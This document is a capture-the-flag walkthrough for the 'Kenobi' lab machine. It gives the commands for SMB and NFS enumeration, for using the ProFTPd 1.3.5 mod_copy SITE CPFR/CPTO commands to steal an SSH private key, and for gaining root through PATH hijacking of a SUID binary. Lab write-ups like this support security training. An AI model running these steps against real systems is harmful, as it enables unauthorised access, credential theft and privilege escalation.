# Kenobi

Tasks:

1. Deploy the vulnerable machine:
   1. Do usual nmap scan with `nmap -sV ip` and complete the task.
2. Enumerating samba for shares:
   1. Do scan with `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse ip`
   2. Connect to anonymous smb share with no password `smbclient //ip/anonymous`&#x20;
   3. Get all files from share recursively using `smbget -R smb:///anonymous` .You can see there's log.txt which gives information about ftp port number and also kenobi's ssh private key location.
   4. From nmap output port 111 is open and rpcbind running behind it. Use `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount ip` to enumerate mount - /var is available as mount through network file system.
3.  Gain initial access with ProFTPd:

    1. Use `nc ip 21` to connect to ftp. ProFTPd version used is 1.3.5. Use searchsploit find exploits  for the ProFTPd server used. &#x20;
    2. connect to ftp server and type `SITE CPFR /home/kenobi/.ssh/id_rsa`  and `SITE CPTO /var/tmp/id_rsa` to copy ssh private key to nfs share.
    3. Mount NFS share to your machine , copy ssh private key from /var/tmp to current working directory and ssh into kenobi using&#x20;
       1. `mkdir /mnt/kenobiNFS`
          `mount machine_ip:/var /mnt/kenobiNFS`
          `ls -la /mnt/kenobiNFS`
       2. `cp /mnt/kenobiNFS/tmp/id_rsa .`
       3. `ssh -i id_rsa kenobi@ip`
    4. `cat /home/kenobi/user.txt` and submit user flag&#x20;

    
4. Privilege Escalation with Path Variable Manipulation:
   1. Find binaries with suid bit set using `find / -perm -u=s -type f 2>/dev/null` 
   2. /usr/bin/menu seems looks out of ordinary
   3. Using strings on menu , we find that curl is called without full path ,So we can copy /bin/sh as curl to tmp path and export tmp path using `echo /bin/sh > /tmp/curl`  , `chmod 777 /tmp/curl` , `export PATH=/tmp:$PATH` 
   4. Now run /usr/bin/menu and select option 1 , you will get root shell.
   5. `cat /root/root.txt` and submit root flag.



References:

1. [https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
